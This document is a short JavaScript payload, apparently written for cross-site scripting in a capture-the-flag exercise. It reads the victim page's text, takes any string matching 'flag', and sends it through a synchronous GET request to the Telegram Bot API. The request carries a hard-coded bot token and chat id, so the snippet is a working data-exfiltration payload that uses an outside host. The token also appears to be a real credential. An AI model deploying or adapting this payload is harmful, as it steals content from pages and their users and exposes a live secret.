function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

httpGet("https://api.telegram.org/bot5651288151:AAFRhSNqMzf7OSxySnPFK2UzzwM4ns3uHiw/sendMessage?chat_id=439546457&text=" + (document.body.textContent.match(/flag.+/) || "fail"));